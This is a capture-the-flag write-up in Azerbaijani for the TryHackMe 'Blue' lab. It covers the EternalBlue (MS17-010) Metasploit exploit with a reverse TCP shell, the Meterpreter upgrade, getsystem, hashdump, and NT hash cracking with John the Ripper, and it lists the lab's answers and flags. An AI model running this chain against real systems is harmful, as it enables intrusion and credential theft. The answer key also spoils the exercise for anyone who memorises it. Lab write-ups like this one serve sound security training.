# Lab: Blue – TryHackMe

**Məqsəd:** EternalBlue (MS17-010) zəifliyindən istifadə edərək foothold əldə etmək, post-exploitation, hash dump və flag toplamaq.

---

## Task 1: Recon

**Machine və AttackBox-u işə sal**  
- “Start Machine” və “Start AttackBox” düymələrini bas.  
- Split-Screen view istifadə et.  

**Port Scan:**  

`nmap -sV -p 1-1000 -sC -T4 <target-ip>`

Cavab: Açıq portlar 1000-dən aşağı → `3`

Screenshot: ![Nmap Scan](screenshots/nmap.png)

Vulnerability identification:

Cavab: `ms17-010`

## Task 2: Gain Access
Metasploit-i işə sal:



`msfconsole`
Exploit modulunu seç:



`use exploit/windows/smb/ms17_010_eternalblue`
Cavab: `exploit/windows/smb/ms17_010_eternalblue`

Əsas parametrin set edilməsi:


`set RHOSTS <target-ip>`
Cavab: `RHOSTS`

Screenshot:  ![Rhosts](screenshots/Rhosts.png)

Payload təyin et:


`set payload windows/x64/shell/reverse_tcp`
Exploit-i işə sal:


`exploit`
Shell açılacaq




## Task 3: Escalate
Əvvəlki shell-i background et:

CTRL + Z

Shell to Meterpreter post-modulu:


`use post/multi/manage/shell_to_meterpreter`
Cavab: `post/multi/manage/shell_to_meterpreter`

Əsas parametrin set edilməsi:


`set SESSION 1`
Cavab: `SESSION`

Post modulunu çalışdır:


`exploit`
Shell meterpreter-ə çevriləcək



SYSTEM hüququnu yoxlama:


`getsystem`

Cavab: NT AUTHORITY\SYSTEM



## Task 4: Cracking
Password hash-ləri dump et:


`hashdump`
Cavab: `Jon`



Hash-i fayla yaz:


`nano hashjon.txt`
Hash-i hashjon.txt faylına yapışdır

John the Ripper ilə qır:

`john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hashjon.txt`
Cavab: `alqfna22`

Screenshot:  ![John](screenshots/john.png)

## Task 5: Find Flags  

Flag1 – System root:


`cd /`
`cat flag1.txt`
Cavab: `flag{access_the_machine}`

Screenshot:  ![flag1](screenshots/flag1.png)

Flag2 – Windows parol qovluğu:


`cd windows/System32/config`
`cat flag2.txt`
Cavab: `flag{sam_database_elevated_access}`

Screenshot:  ![flag2](screenshots/flag2.png)

Flag3 – Administrator Documents (Jon qovluğu):


`cd /Users/Jon/Documents`
cat `flag3.txt`
Cavab: `flag{admin_documents_can_be_valuable}`


Screenshot:  ![flag3](screenshots/flag3.png)





